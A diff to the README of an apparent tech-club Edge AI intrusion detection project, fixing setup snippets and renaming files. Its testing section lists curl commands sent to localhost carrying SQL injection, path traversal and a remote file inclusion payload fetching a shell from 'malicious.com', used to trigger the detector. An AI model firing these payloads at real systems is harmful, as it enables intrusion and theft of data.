@@ -46,7 +46,9 @@ A decentralized, Edge AI-powered Intrusion Detection System with a Continuous Le
 
 1. **Create the Environment Variables file:**Create a file named exactly `.env` in your root directory to securely store your paths and webhooks (following the 12-Factor App methodology):
 
-    LOG_FILE_PATH=system_errors.logMODEL_FILE_PATH=network_watchdog.onnxESP32_WEBHOOK_URL=[http://192.168.1.](http://192.168.1.)XXX/update
+    LOG_FILE_PATH=system_errors.log
+    MODEL_FILE_PATH=network_watchdog.onnx
+    ESP32_WEBHOOK_URL=http://192.168.1.XX/update
 
 *(Note: You will update the IP address after booting the ESP32 in Part 2).*
 
@@ -61,7 +63,8 @@ A decentralized, Edge AI-powered Intrusion Detection System with a Continuous Le
     - *Status LEDs: Green on Pin 18, Orange on Pin 5.*
 2. **Setup Secrets Configuration:**In your Arduino IDE, create a new tab named `secrets.h` to keep your Wi-Fi credentials out of the main code:
 
-    #define SECRET_WIFI_SSID "Your_WiFi_Network_Name"#define SECRET_WIFI_PASS "Your_WiFi_Password"
+    #define SECRET_WIFI_SSID "Your_WiFi_Network_Name"
+    #define SECRET_WIFI_PASS "Your_WiFi_Password"
 
 1. **Install Arduino Libraries & Flash:**
 
@@ -74,21 +77,23 @@ A decentralized, Edge AI-powered Intrusion Detection System with a Continuous Le
 
 1. **Start the Watchdog:**Run the main Python inference script on your edge device:
 
-    python live_npu_inference.py
+    python main_v2.py
 
 1. **Open the Dashboard:**On any phone or computer on the same Wi-Fi network, type the ESP32's IP address into the browser to view the live SOC dashboard.
 2. **Simulate Attacks (Testing):**Open a new terminal and fire `curl` commands to trigger the system.
 
 *High Confidence Threats (Triggers Retraining Counter):*
 
-    curl "http://localhost:8080/login?user=admin'%20OR%20'1'='1"curl --path-as-is "http://localhost:8080/../../../windows/system32/cmd.exe"
+    curl "http://localhost:8080/login?user=admin'%20OR%20'1'='1"
+    curl --path-as-is "http://localhost:8080/../../../windows/system32/cmd.exe"
 
 *Low Confidence Warnings (Ambiguous Payloads):*
 
-    curl "http://localhost:8080/index.php?page=[http://malicious.com/shell.txt](http://malicious.com/shell.txt)"curl "http://localhost:8080/api/users?id=1%20UNION%20SELECT%20password%20FROM%20admin"
+    curl "http://localhost:8080/api/users?id=1%20UNION%20SELECT%20password%20FROM%20admin"
+    curl "http://localhost:8080/index.php?page=http://malicious.com/shell.txt"
 
 ### 🧠 Triggering Continuous Learning
 
-By default, the AI is programmed to retrain after identifying **5 new THREATs**. Fire 5 distinct `THREAT` level attacks at your server. You will see the background thread (`Brain 2`) wake up, read the updated `dataset.csv`, export `network_watchdog_v2.onnx`, and Hot-Swap the NPU engine in real-time.
+By default, the AI is programmed to retrain after identifying **5 new THREATs**. Fire 5 distinct `THREAT` level attacks at your server. You will see the background thread (`Brain 2`) wake up, read the updated `dataset.csv`, export `custom_model_v2.onnx`, and Hot-Swap the NPU engine in real-time.
 
 *Developed for Tech Club Demonstration - Edge AI & Network Security.*
